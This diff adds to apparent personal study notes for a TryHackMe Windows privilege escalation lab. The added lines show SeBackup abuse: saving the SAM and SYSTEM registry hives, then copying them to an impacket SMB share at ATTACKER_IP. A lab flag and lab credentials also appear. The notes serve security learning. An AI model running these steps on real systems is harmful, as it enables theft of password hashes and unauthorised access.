@@ -160,5 +160,31 @@ sc stop THMService
 sc start THMService
 *THM{INSECURE_SVC_CONFIG}
 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows Privileges
+xfreerdp /u:THMBackup /p:CopyMaster555 /v:[IP]
+-privileges are rights that an account has to perform specific system-related tasks
+-check assigned privileges
+whoami /priv
+
+SeBackup / SeRestore
+-allow user to read and write any file in the system ingnoring DACL
+-granted to "backup operators" group 
+-open Command Prompt as Admin
+whoami /priv
+cd C:\
+-backup SAM and System hashes
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+-copy file to attacker machine using SMB smbserver.py
+mkdir share
+-use impacket smbserver.py
+python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+-copy to share
+C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+
+
 
 
